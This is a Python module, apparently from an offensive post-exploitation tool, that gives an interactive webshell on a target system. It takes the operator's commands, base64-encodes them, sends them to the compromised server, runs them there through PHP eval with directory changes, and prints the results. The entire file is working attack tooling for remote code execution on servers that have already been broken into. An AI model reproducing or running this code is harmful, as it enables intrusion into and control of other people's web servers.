from libs.config import gget, gset, alias, color, set_namespace
from libs.myapp import send, base64_encode
from libs.app import getline


@alias(func_alias="ws")
def run():
    """
    webshell

    Get a webshell of target system.
    """
    print(color.cyan("Eenter interactive temporary webshell...\n\nUse 'back' command to return doughnuts.\n"))
    pwd = send(f'print(getcwd());').r_text.strip()
    set_namespace("webshell", False, True)
    wordlist = gget("webshell.wordlist")
    gset("webshell.wordlist", {}, True)
    while gget("loop"):
        print(f"webshell:{pwd} >> ", end="")
        data = getline()
        lower_data = data.lower()
        if (lower_data.lower() in ['exit', 'quit', 'back']):
            print()
            break
        if (data == ''):
            print()
            continue
        data = base64_encode(data)
        b64_pwd = base64_encode(pwd)
        if (lower_data.startswith("cd ") and len(lower_data) > 3):
            path = base64_encode(lower_data[3:].strip())
            res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
            if (not res):
                return
            pwd = res.r_text.strip()
        else:
            res = send(f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{data}\'));");')
            if (not res):
                return
            print("\n" + res.r_text.strip() + "\n")
    gset("webshell.wordlist", wordlist, True)
